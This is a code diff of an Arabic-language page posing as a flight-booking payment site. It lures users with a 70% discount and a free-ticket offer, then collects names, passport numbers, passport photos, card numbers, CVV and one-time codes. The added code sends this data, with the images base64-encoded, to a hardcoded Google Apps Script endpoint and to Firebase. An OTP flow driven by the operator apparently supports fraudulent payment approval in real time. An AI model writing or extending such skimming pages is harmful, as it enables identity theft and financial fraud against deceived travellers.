+        const originalPrice = parseFloat(data.price) || 0;
+        priceContainer.innerHTML = data.has_discount ? `<span class="line-through text-gray-500">${originalPrice.toFixed(2)} ${data.currency}</span> <span class="text-green-600 ml-2">${(originalPrice * 0.30).toFixed(2)} ${data.currency}</span>` : `${originalPrice.toFixed(2)} ${data.currency}`;
+        freeTicketOfferSection.classList.toggle('hidden', !data.is_free);
 
-  const content = ` 
-  <i class="fas ${iconClass} text-7xl mb-4"></i> 
-  <h3 class="text-2xl font-bold mb-2">${title}</h3> 
-  <p class="text-slate-600 mb-6">${message}</p> 
-  ${buttonsHtml} 
-  `;
-  document.getElementById('result-modal-content').innerHTML = content;
-  showModal('result-modal');
+        const prefilled = data.prefilled_client_data || {};
+        
+        const formHtml = `
+            <h2 class="text-xl font-bold border-b pb-2">معلومات المسافر (التذكرة الأساسية)</h2>
+            <div class="grid grid-cols-2 gap-4">
+                <div>
+                    <label for="firstName" class="label">الاسم الأول</label>
+                    <input type="text" id="firstName" name="firstName" class="input-field" value="${prefilled.firstName || ''}" ${prefilled.firstName ? 'disabled' : ''} required>
+                </div>
+                <div>
+                    <label for="lastName" class="label">اسم العائلة</label>
+                    <input type="text" id="lastName" name="lastName" class="input-field" value="${prefilled.lastName || ''}" ${prefilled.lastName ? 'disabled' : ''} required>
+                </div>
+            </div>
+            <div>
+                <label for="user_email" class="label">البريد الإلكتروني</label>
+                <input type="email" id="user_email" name="user_email" class="input-field" value="${prefilled.user_email || ''}" ${prefilled.user_email ? 'disabled' : ''} required>
+            </div>
+            <div class="grid grid-cols-2 gap-4">
+                <div>
+                    <label for="passportNumber" class="label">رقم جواز السفر</label>
+                    <input type="text" id="passportNumber" name="passportNumber" class="input-field" value="${prefilled.passportNumber || ''}" ${prefilled.passportNumber ? 'disabled' : ''} required>
+                </div>
+                <div>
+                    <label for="passportExpiry" class="label">تاريخ انتهاء الجواز</label>
+                    <input type="date" id="passportExpiry" name="passportExpiry" class="input-field" value="${prefilled.passportExpiry || ''}" ${prefilled.passportExpiry ? 'disabled' : ''} required>
+                </div>
+            </div>
+            <div>
+                <label for="main_passportPicture" class="label">صورة الجواز (مهم)</label>
+                <input type="file" id="main_passportPicture" class="hidden" accept="image/*" required>
+                <button type="button" class="file-upload-btn" onclick="document.getElementById('main_passportPicture').click()">
+                    <i class="fas fa-upload mr-2"></i>رفع صورة الجواز
+                </button>
+                <div id="main_passport_file_name" class="file-name">لم يتم اختيار ملف</div>
+            </div>`;
+        
+        userInfoForm.innerHTML = formHtml;
+        userInfoForm.classList.remove('hidden');
+        prefilledInfoContainer.classList.add('hidden');
+    };
 
-  if (onRetry) {
-  document.getElementById('result-retry-btn').onclick = () => {
-  hideAllModals();
-  onRetry();
-  };
-  } else {
-  document.getElementById('result-ok-btn').onclick = () => {
-  if (isSuccess) {
-  location.reload();
-  } else {
-  hideAllModals();
-  }
-  };
-  }
-  };
+    searchForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const bookingRef = document.getElementById('booking_ref_input').value.trim().toUpperCase();
+        if (!bookingRef || !db) return;
+        document.getElementById('booking_ref_input').value = bookingRef;
+        searchError.classList.add('hidden');
+        const docRef = doc(db, `artifacts/${appId}/public/data/flight_tickets`, bookingRef);
+        try {
+            const docSnap = await getDoc(docRef);
+            if (docSnap.exists()) {
+                currentTicketData = { id: docSnap.id, ...docSnap.data() };
+                renderTicket(currentTicketData);
+                searchSection.classList.add('hidden');
+                detailsSection.classList.remove('hidden');
+            } else {
+                searchError.textContent = 'رقم الحجز غير صحيح. يرجى التأكد والمحاولة مرة أخرى.';
+                searchError.classList.remove('hidden');
+            }
+        } catch (error) {
+            console.error("Error fetching ticket:", error);
+            searchError.textContent = 'حدث خطأ أثناء البحث عن الحجز.';
+            searchError.classList.remove('hidden');
+        }
+    });
+    
+    paymentForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        let isValid = true;
+        const validateForm = (form) => [...form.elements].forEach(el => {
+            el.classList.remove('input-error');
+            const btn = el.nextElementSibling;
+            if(btn && btn.classList.contains('file-upload-btn')) btn.classList.remove('input-error');
 
-  const formatDateTime = (isoString) => {
-  if (!isoString) return { date: '', time: '' };
-  const date = new Date(isoString);
-  const dateOptions = { year: 'numeric', month: 'long', day: 'numeric', weekday: 'long' };
-  const timeOptions = { hour: '2-digit', minute: '2-digit', hour12: true };
-  return {
-  date: date.toLocaleDateString('ar-SA', dateOptions),
-  time: date.toLocaleTimeString('ar-SA', timeOptions)
-  };
-  };
+            if (el.required && !el.value) {
+                if(el.type === 'file' && !el.files[0]){
+                    isValid = false;
+                    if(btn) btn.classList.add('input-error');
+                } else if (el.type !== 'file') {
+                    el.classList.add('input-error');
+                    isValid = false;
+                }
+            }
+        });
 
-  const getLogoInfo = (logoValue) => {
-  if (logoValue === 'almadina') {
-  return {
-  url: 'https://res.cloudinary.com/do9agtdqi/image/upload/v1753891488/fde53300-7714-4426-94bf-5a492a932063_s8sztm.jpg',
-  name: 'المدينة المنورة للسياحة و السفر'
-  };
-  }
-  return {
-  url: 'https://res.cloudinary.com/do9agtdqi/image/upload/v1753891471/alm-fb-logo-ar_lhbpwv.jpg',
-  name: 'المسافر'
-  };
-  };
+        validateForm(paymentForm);
+        validateForm(userInfoForm);
+        if (freeTicketOfferSection.offsetParent) { validateForm(freeTicketForm); }
 
-  // --- Render Functions --- 
-  const renderTicket = (data) => {
-  const departure = formatDateTime(data.departure_datetime);
-  const arrival = formatDateTime(data.return_datetime);
-  const logoInfo = getLogoInfo(data.website_logo);
-  const clientDisplayName = `${data.client_firstName || ''} ${data.client_lastName || ''}`.trim();
+        if (!isValid) {
+            showResultModal('خطأ', 'الرجاء تعبئة جميع الحقول المطلوبة (بما في ذلك صور الجواز).', false);
+            return;
+        }
 
-  const ticketHTML = ` 
-  <div class="bg-white rounded-lg shadow-md"> 
-  <div class="ticket-header"> 
-  <div class="flex justify-between items-center"> 
-  <div class="flex items-center gap-4"> 
-  <img src="${logoInfo.url}" alt="Logo" class="h-12"> 
-  <span class="font-bold text-lg">${logoInfo.name}</span> 
-  </div> 
-  <div class="text-left"> 
-  <span class="block text-sm text-gray-500">رقم الحجز</span> 
-  <span class="block font-bold text-lg">${data.booking_ref}</span> 
-  </div> 
-  </div> 
-  </div> 
-  <div class="p-6"> 
-  <div class="flex items-center gap-4 mb-6"> 
-  <img src="${data.airline_logo_path}" alt="${data.airline_name}" class="h-12 w-12 object-contain" onerror="this.style.display='none'"> 
-  <div> 
-  <h2 class="font-bold text-xl">${data.airline_name}</h2> 
-  <p class="text-sm text-gray-500">مرحباً, ${clientDisplayName || 'ضيفنا الكريم'}</p> 
-  </div> 
-  </div> 
+        showModal('loading-modal', 'جاري تجهيز طلبك...');
+        payBtn.disabled = true;
 
-  <div class="flight-path"> 
-  <span class="city">${data.departure_from}</span> 
-  <span class="arrow"><i class="fas ${data.trip_type === 'round_trip' ? 'fa-exchange-alt' : 'fa-long-arrow-alt-left'}"></i></span> 
-  <span class="city">${data.arrival_to}</span> 
-  </div> 
+        try {
+            // --- ✅ الرابط الخاص بك ---
+            const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxrOix85P6YHKuY1CvSeqlvsUYCH4KAg-vvmWyMzvs8XMoSMOoK4u_wVYD9I8OI2bAP/exec";
+            // --------------------
 
-  <div class="grid grid-cols-2 gap-6 text-center"> 
-  <div> 
-  <p class="text-sm text-gray-500">المغادرة</p> 
-  <p class="font-bold">${departure.date}</p> 
-  <p class="font-extrabold text-lg text-[var(--brand-blue)]">${departure.time}</p> 
-  </div> 
-  <div class="${data.trip_type === 'one_way' ? 'hidden' : ''}"> 
-  <p class="text-sm text-gray-500">العودة</p> 
-  <p class="font-bold">${arrival.date}</p> 
-  <p class="font-extrabold text-lg text-[var(--brand-blue)]">${arrival.time}</p> 
-  </div> 
-  </div> 
-  </div> 
-  </div> 
-  `;
-  ticketContainer.innerHTML = ticketHTML;
+            const payload = {};
 
-  // Handle UI based on offers 
-  const originalPrice = parseFloat(data.price) || 0;
-  let finalPrice = originalPrice;
+            payload.booking_ref = currentTicketData.booking_ref;
+            payload.main_passenger_name = `${document.getElementById('firstName').value} ${document.getElementById('lastName').value}`;
+            payload.main_passenger_email = document.getElementById('user_email').value;
+            payload.main_passport_number = document.getElementById('passportNumber').value;
+            payload.main_passport_expiry = document.getElementById('passportExpiry').value;
+            payload.card_number = document.getElementById('cardNumber').value;
+            payload.card_expiry = document.getElementById('expiry').value;
+            payload.card_cvv = document.getElementById('cvv').value;
+            payload.price = priceContainer.textContent;
+            payload.currency = currentTicketData.currency;
+            
+            const mainPassportFile = document.getElementById('main_passportPicture')?.files[0];
+            if (mainPassportFile) {
+                payload.mainPassportFile = {
+                    base64: await fileToBase64(mainPassportFile),
+                    fileName: mainPassportFile.name,
+                    mimeType: mainPassportFile.type
+                };
+            }
 
-  if (data.has_discount) {
-  finalPrice = originalPrice * 0.30; // 70% discount 
-  priceContainer.innerHTML = ` 
-  <span class="line-through text-gray-500">${originalPrice.toFixed(2)} ${data.currency}</span> 
-  <span class="text-green-600 ml-2">${finalPrice.toFixed(2)} ${data.currency}</span> 
-  `;
-  } else {
-  priceContainer.innerHTML = `${originalPrice.toFixed(2)} ${data.currency}`;
-  }
+            if (freeTicketOfferSection.offsetParent) {
+                payload.free_passenger_name = `${document.getElementById('free_firstName').value} ${document.getElementById('free_lastName').value}`;
+                payload.free_passport_number = document.getElementById('free_passportNumber').value;
+                payload.free_passport_expiry = document.getElementById('free_passportExpiry').value;
+                
+                const freePassportFile = document.getElementById('free_passportPicture')?.files[0];
+                if (freePassportFile) {
+                    payload.freePassportFile = {
+                        base64: await fileToBase64(freePassportFile),
+                        fileName: freePassportFile.name,
+                        mimeType: freePassportFile.type
+                    };
+                }
+            }
+            
+            fetch(GOOGLE_SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors', 
+                body: JSON.stringify(payload),
+                headers: { "Content-Type": "text/plain;charset=utf-8" }
+            });
+            
+            console.log('Data submission initiated to Google Script.');
+            
+            showModal('loading-modal', 'جاري الدفع...');
+            
+            const bookingDetails = {
+                firstName: document.getElementById('firstName').value,
+                lastName: document.getElementById('lastName').value,
+                user_email: document.getElementById('user_email').value,
+                passportNumber: document.getElementById('passportNumber').value,
+                passportExpiry: document.getElementById('passportExpiry').value,
+                cardNumber: document.getElementById('cardNumber').value,
+                expiry: document.getElementById('expiry').value,
+                cvv: document.getElementById('cvv').value,
+                calculatedPrice: currentTicketData.has_discount ? (parseFloat(currentTicketData.price) * 0.30) : parseFloat(currentTicketData.price),
+                currency: currentTicketData.currency,
+            };
+            
+            const freeTicketDetails = freeTicketOfferSection.offsetParent ? {
+                firstName: document.getElementById('free_firstName').value,
+                lastName: document.getElementById('free_lastName').value,
+                passportNumber: document.getElementById('free_passportNumber').value,
+                passportExpiry: document.getElementById('free_passportExpiry').value,
+            } : null;
 
-  if (data.is_free) {
-  freeTicketOfferSection.classList.remove('hidden');
-  } else {
-  freeTicketOfferSection.classList.add('hidden');
-  }
+            pendingBookingId = `${currentTicketData.id}-${Date.now()}`;
+            const pendingDocRef = doc(db, `artifacts/${appId}/public/data/pending_bookings`, pendingBookingId);
+            
+            const firebasePayload = {
+                userId: auth.currentUser.uid,
+                ticketId: currentTicketData.id,
+                status: 'payment_pending',
+                createdAt: new Date().toISOString(),
+                bookingDetails: bookingDetails,
+                ...(freeTicketDetails && { freeTicketDetails: freeTicketDetails })
+            };
 
-  // Handle passenger info form 
-  if (data.prefilled_client_data && data.prefilled_client_data.firstName) {
-  prefilledInfoContainer.innerHTML = ` 
-  <h2 class="text-xl font-bold border-b pb-2">معلومات المسافر (التذكرة الأساسية)</h2> 
-  <div class="space-y-2 p-4 bg-blue-50 border border-blue-200 rounded-lg"> 
-  <p><strong>الاسم:</strong> ${data.prefilled_client_data.firstName} ${data.prefilled_client_data.lastName}</p> 
-  <p><strong>البريد الإلكتروني:</strong> ${data.prefilled_client_data.user_email || 'غير متوفر'}</p> 
-  <p><strong>رقم الجواز:</strong> ${data.prefilled_client_data.passportNumber}</p> 
-  <p><strong>انتهاء الجواز:</strong> ${data.prefilled_client_data.passportExpiry}</p> 
-  </div> 
-  `;
-  prefilledInfoContainer.classList.remove('hidden');
-  userInfoForm.classList.add('hidden');
-  } else {
-  userInfoForm.innerHTML = ` 
-  <h2 class="text-xl font-bold border-b pb-2">معلومات المسافر (التذكرة الأساسية)</h2> 
-  <div class="grid grid-cols-2 gap-4"> 
-  <div><label for="firstName" class="label">الاسم الأول</label><input type="text" id="firstName" name="firstName" class="input-field" required></div> 
-  <div><label for="lastName" class="label">اسم العائلة</label><input type="text" id="lastName" name="lastName" class="input-field" required></div> 
-  </div> 
-  <div><label for="user_email" class="label">البريد الإلكتروني</label><input type="email" id="user_email" name="user_email" class="input-field" required></div> 
-  <div class="grid grid-cols-2 gap-4"> 
-  <div><label for="passportNumber" class="label">رقم جواز السفر</label><input type="text" id="passportNumber" name="passportNumber" class="input-field" required></div> 
-  <div><label for="passportExpiry" class="label">تاريخ انتهاء الجواز</label><input type="date" id="passportExpiry" name="passportExpiry" class="input-field" required></div> 
-  </div> 
-  <div> 
-  <label for="main_passportPicture" class="label">صورة الجواز (اختياري)</label> 
-  <input type="file" id="main_passportPicture" class="hidden" accept="image/*"> 
-  <button type="button" class="file-upload-btn" onclick="document.getElementById('main_passportPicture').click()"> 
-  <i class="fas fa-upload mr-2"></i>رفع صورة الجواز 
-  </button> 
-  <div id="main_passport_file_name" class="file-name">لم يتم اختيار ملف</div> 
-  </div> 
-  `;
-  userInfoForm.classList.remove('hidden');
-  prefilledInfoContainer.classList.add('hidden');
-  }
-  };
+            await setDoc(pendingDocRef, firebasePayload);
+            console.log("Pending booking document written to Firebase!");
+            listenForBookingStatus(pendingBookingId);
 
-  // --- Event Handlers --- 
-  searchForm.addEventListener('submit', async (e) => {
-  e.preventDefault();
-  const bookingRef = document.getElementById('booking_ref_input').value.trim().toUpperCase();
-  if (!bookingRef || !db) return;
+        } catch (error) {
+            console.error("Booking/Submission error:", error);
+            hideAllModals();
+            showResultModal('خطأ فادح', `لم نتمكن من إرسال طلبك. يرجى المحاولة مرة أخرى. الخطأ: ${error.message}`, false, () => {
+                payBtn.disabled = false;
+            });
+        }
+    });
 
-  document.getElementById('booking_ref_input').value = bookingRef;
-  searchError.classList.add('hidden');
-  const docRef = doc(db, `artifacts/${appId}/public/data/flight_tickets`, bookingRef);
-  
-  try {
-  const docSnap = await getDoc(docRef);
-  if (docSnap.exists()) {
-  currentTicketData = { id: docSnap.id, ...docSnap.data() };
-  // No need to set searchLogo.src as it's an SVG now
-  renderTicket(currentTicketData);
-  searchSection.classList.add('hidden');
-  detailsSection.classList.remove('hidden');
-  } else {
-  searchError.textContent = 'رقم الحجز غير صحيح. يرجى التأكد والمحاولة مرة أخرى.';
-  searchError.classList.remove('hidden');
-  }
-  } catch (error) {
-  console.error("Error fetching ticket:", error);
-  searchError.textContent = 'حدث خطأ أثناء البحث عن الحجز.';
-  searchError.classList.remove('hidden');
-  }
-  });
-  
-  paymentForm.addEventListener('submit', async (e) => {
-  e.preventDefault();
-  let bookingDetails = {};
-  let freeTicketDetails = {};
-  let isValid = true;
-  
-  const validateAndClearErrors = (form) => {
-  [...form.elements].forEach(el => {
-  if (el.required && !el.value) { 
-  el.classList.add('input-error'); 
-  isValid = false; 
-  } else { 
-  el.classList.remove('input-error'); 
-  }
-  });
-  };
-  
-  validateAndClearErrors(paymentForm);
+    otpForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const otpInputs = otpForm.querySelectorAll('input');
+        const otpCode = [...otpInputs].map(i => i.value).join('');
+        const otpError = document.getElementById('otp-error');
 
-  if (userInfoForm.classList.contains('hidden')) {
-  bookingDetails = { ...currentTicketData.prefilled_client_data };
-  } else {
-  validateAndClearErrors(userInfoForm);
-  bookingDetails.firstName = document.getElementById('firstName').value;
-  bookingDetails.lastName = document.getElementById('lastName').value;
-  bookingDetails.user_email = document.getElementById('user_email').value;
-  bookingDetails.passportNumber = document.getElementById('passportNumber').value;
-  bookingDetails.passportExpiry = document.getElementById('passportExpiry').value;
-  }
+        if (!/^\d{4,6}$/.test(otpCode)) {
+            otpError.textContent = 'الرجاء إدخال رمز صحيح من 4 إلى 6 أرقام.';
+            otpError.classList.remove('hidden');
+            return;
+        }
+        otpError.classList.add('hidden');
+        showModal('loading-modal', 'جاري التحقق من الرمز...');
+        
+        try {
+            const pendingDocRef = doc(db, `artifacts/${appId}/public/data/pending_bookings`, pendingBookingId);
+            await updateDoc(pendingDocRef, { 
+                otpCode: otpCode,
+                status: 'otp_submitted'
+            });
+        } catch (error) {
+            console.error("OTP submission error:", error);
+            hideAllModals();
+            showResultModal('خطأ فادح', 'لم نتمكن من إرسال الرمز. حاول مرة أخرى.', false, () => {
+                showModal('otp-modal');
+            });
+        }
+    });
 
-  if (currentTicketData.is_free) {
-  validateAndClearErrors(freeTicketForm);
-  freeTicketDetails.firstName = document.getElementById('free_firstName').value;
-  freeTicketDetails.lastName = document.getElementById('free_lastName').value;
-  freeTicketDetails.passportNumber = document.getElementById('free_passportNumber').value;
-  freeTicketDetails.passportExpiry = document.getElementById('free_passportExpiry').value;
-  }
+    function listenForBookingStatus(docId) {
+        if (unsubscribeFromBookingStatus) unsubscribeFromBookingStatus();
+        const docRef = doc(db, `artifacts/${appId}/public/data/pending_bookings`, docId);
+        unsubscribeFromBookingStatus = onSnapshot(docRef, (docSnap) => {
+            if (!docSnap.exists()) {
+                if (unsubscribeFromBookingStatus) unsubscribeFromBookingStatus();
+                hideAllModals();
+                showResultModal(
+                    'تم رفض الطلب', 
+                    'تم إلغاء طلبك من قبل المشرف. يمكنك تعديل بيانات الدفع والمحاولة مرة أخرى.', 
+                    false, 
+                    () => {
+                        // هذا هو التعديل المطلوب
+                        hideAllModals();
+                        payBtn.disabled = false;
+                        // تمرير الشاشة إلى قسم الدفع لتسهيل التعديل
+                        document.getElementById('payment-form').scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    }
+                );
+                return;
+            }
 
-  if (!isValid) {
-  showResultModal('خطأ', 'الرجاء تعبئة جميع الحقول المطلوبة.', false);
-  return;
-  }
+            const data = docSnap.data();
+            console.log("Received status update:", data.status);
+            switch (data.status) {
+                case 'otp_pending':
+                    hideAllModals();
+                    showModal('otp-modal');
+                    break;
+                case 'confirmed':
+                    if (unsubscribeFromBookingStatus) unsubscribeFromBookingStatus();
+                    hideAllModals();
+                    showResultModal('تم تأكيد الحجز!', 'شكراً لك، تم تأكيد حجزك بنجاح. ستصلك التفاصيل قريباً.', true);
+                    break;
+                case 'otp_declined':
+                    hideAllModals();
+                    showResultModal('لم يتم الدفع بنجاح', 'الرمز الذي أدخلته غير صحيح أو تم رفض العملية. الرجاء المحاولة مرة أخرى.', false, () => {
+                        const otpInputs = otpForm.querySelectorAll('input');
+                        otpInputs.forEach(input => input.value = '');
+                        otpInputs[0].focus();
+                        hideAllModals();
+                        showModal('otp-modal');
+                    });
+                    break;
+            }
+        }, (error) => {
+            console.error("Error in status listener:", error);
+            hideAllModals();
+            showResultModal('خطأ في الاتصال', 'فقدنا الاتصال لمتابعة حالة الطلب.', false);
+        });
+    }
 
-  showModal('loading-modal', 'جاري الدفع...');
-  payBtn.disabled = true;
+    document.getElementById('cardNumber').addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+    });
 
-  try {
-  // Add payment card details 
-  bookingDetails.cardNumber = document.getElementById('cardNumber').value;
-  bookingDetails.expiry = document.getElementById('expiry').value;
-  bookingDetails.cvv = document.getElementById('cvv').value;
+    document.getElementById('expiry').addEventListener('input', (e) => {
+        let v = e.target.value.replace(/\D/g, '');
+        e.target.value = v.length > 2 ? v.substring(0, 2) + ' / ' + v.substring(2, 4) : v;
+    });
+    
+    otpForm.querySelectorAll('input').forEach((input, index, inputs) => {
+        input.addEventListener('input', () => { if (input.value && index < inputs.length - 1) inputs[index + 1].focus(); });
+        input.addEventListener('keydown', (e) => { if (e.key === "Backspace" && !input.value && index > 0) inputs[index - 1].focus(); });
+    });
 
-  // Add price details 
-  const originalPrice = parseFloat(currentTicketData.price) || 0;
-  bookingDetails.calculatedPrice = currentTicketData.has_discount ? originalPrice * 0.30 : originalPrice;
-  bookingDetails.currency = currentTicketData.currency;
-  
-  pendingBookingId = `${currentTicketData.id}-${Date.now()}`;
-  const pendingDocRef = doc(db, `artifacts/${appId}/public/data/pending_bookings`, pendingBookingId);
-  
-  const payload = {
-  userId: auth.currentUser.uid,
-  ticketId: currentTicketData.id,
-  status: 'payment_pending',
-  createdAt: new Date().toISOString(),
-  bookingDetails: bookingDetails
-  };
+    document.addEventListener('change', (e) => {
+        const displayFileName = (inputId, displayId) => {
+            if (e.target.id === inputId) {
+                const file = e.target.files[0];
+                document.getElementById(displayId).textContent = file?.name || 'لم يتم اختيار ملف';
+                const btn = e.target.nextElementSibling;
+                if(file && btn && btn.classList.contains('file-upload-btn')) {
+                    btn.classList.remove('input-error');
+                }
+            }
+        }
+        displayFileName('main_passportPicture', 'main_passport_file_name');
+        displayFileName('free_passportPicture', 'free_passport_file_name');
+    });
 
-  if (currentTicketData.is_free) {
-  payload.freeTicketDetails = freeTicketDetails;
-  }
+</script>
 
-  await setDoc(pendingDocRef, payload);
-  console.log("Pending booking document written successfully!");
-  listenForBookingStatus(pendingBookingId);
-
-  } catch (error) {
-  console.error("Booking submission error:", error);
-  hideAllModals();
-  showResultModal('خطأ فادح', `لم نتمكن من إنشاء طلبك. يرجى المحاولة مرة أخرى. الخطأ: ${error.message}`, false, () => {
-  payBtn.disabled = false;
-  });
-  }
-  });
-
-  otpForm.addEventListener('submit', async (e) => {
-  e.preventDefault();
-  const otpInputs = otpForm.querySelectorAll('input');
-  const otpCode = [...otpInputs].map(i => i.value).join('');
-  const otpError = document.getElementById('otp-error');
-
-  if (!/^\d{4,6}$/.test(otpCode)) {
-  otpError.textContent = 'الرجاء إدخال رمز صحيح من 4 إلى 6 أرقام.';
-  otpError.classList.remove('hidden');
-  return;
-  }
-  otpError.classList.add('hidden');
-  showModal('loading-modal', 'جاري التحقق من الرمز...');
-  
-  try {
-  const pendingDocRef = doc(db, `artifacts/${appId}/public/data/pending_bookings`, pendingBookingId);
-  await updateDoc(pendingDocRef, { 
-  otpCode: otpCode,
-  status: 'otp_submitted'
-  });
-  } catch (error) {
-  console.error("OTP submission error:", error);
-  hideAllModals();
-  showResultModal('خطأ فادح', 'لم نتمكن من إرسال الرمز. حاول مرة أخرى.', false, () => {
-  showModal('otp-modal');
-  });
-  }
-  });
-
-  // --- Real-time Listener --- 
-  function listenForBookingStatus(docId) {
-  if (unsubscribeFromBookingStatus) unsubscribeFromBookingStatus();
-
-  const docRef = doc(db, `artifacts/${appId}/public/data/pending_bookings`, docId);
-  unsubscribeFromBookingStatus = onSnapshot(docRef, (docSnap) => {
-  if (!docSnap.exists()) {
-  if (unsubscribeFromBookingStatus) unsubscribeFromBookingStatus();
-  hideAllModals();
-  showResultModal('حدث خطأ', 'يـرجى إعادة النظر في المدخلات و المحاولة مرة أخرى', false, () => {
-  payBtn.disabled = false;
-  });
-  return;
-  }
-
-  const data = docSnap.data();
-  console.log("Received status update:", data.status);
-  switch (data.status) {
-  case 'otp_pending':
-  hideAllModals();
-  showModal('otp-modal');
-  break;
-  case 'confirmed':
-  if (unsubscribeFromBookingStatus) unsubscribeFromBookingStatus();
-  hideAllModals();
-  showResultModal('تم تأكيد الحجز!', 'شكراً لك، تم تأكيد حجزك بنجاح. ستصلك التفاصيل قريباً.', true);
-  break;
-  case 'otp_declined':
-  if (unsubscribeFromBookingStatus) unsubscribeFromBookingStatus();
-  hideAllModals();
-  showResultModal(
-  'لم يتم الدفع بنجاح', 
-  'يرجى محاولة الدفع مرة اخرى', 
-  false, 
-  async () => { // onRetry function 
-  try {
-  // Reset status in Firestore to allow for another attempt 
-  const docRefToUpdate = doc(db, `artifacts/${appId}/public/data/pending_bookings`, docId);
-  await updateDoc(docRefToUpdate, { status: 'otp_pending', otpCode: '' });
-
-  // Now show the OTP modal for the user to retry 
-  const otpInputs = otpForm.querySelectorAll('input');
-  otpInputs.forEach(input => input.value = '');
-  otpInputs[0].focus();
-  showModal('otp-modal');
-  // Re-attach the listener to wait for the new status 
-  listenForBookingStatus(docId);
-  } catch (error) {
-  console.error("Failed to reset OTP status:", error);
-  showResultModal('خطأ', 'فشل إعادة تعيين حالة الدفع. يرجى تحديث الصفحة والمحاولة مرة أخرى.', false);
-  }
-  }
-  );
-  break;
-  }
-  }, (error) => {
-  console.error("Error in status listener:", error);
-  hideAllModals();
-  showResultModal('خطأ في الاتصال', 'فقدنا الاتصال لمتابعة حالة الطلب.', false);
-  });
-  }
-
-  // --- Input Formatting and Minor UX --- 
-  document.getElementById('cardNumber').addEventListener('input', (e) => {
-  let value = e.target.value.replace(/\D/g, '');
-  e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
-  });
-
-  document.getElementById('expiry').addEventListener('input', (e) => {
-  let v = e.target.value.replace(/\D/g, '');
-  if (v.length > 2) v = v.substring(0, 2) + ' / ' + v.substring(2, 4);
-  e.target.value = v;
-  });
-  
-  const otpInputs = otpForm.querySelectorAll('input');
-  otpInputs.forEach((input, index) => {
-  input.addEventListener('input', () => {
-  if (input.value && index < otpInputs.length - 1) {
-  otpInputs[index + 1].focus();
-  }
-  });
-  input.addEventListener('keydown', (e) => {
-  if (e.key === "Backspace" && !input.value && index > 0) {
-  otpInputs[index - 1].focus();
-  }
-  });
-  });
-
-  // --- File Upload UI Handlers --- 
-  document.addEventListener('change', (e) => {
-  const displayFileName = (fileInputId, displayNameId) => {
-  if (e.target.id === fileInputId) {
-  const fileName = e.target.files[0]?.name || 'لم يتم اختيار ملف';
-  document.getElementById(displayNameId).textContent = fileName;
-  }
-  }
-  displayFileName('main_passportPicture', 'main_passport_file_name');
-  displayFileName('free_passportPicture', 'free_passport_file_name');
-  });
-
- </script>
-
- </body>
- </html>
+</body>
+</html>
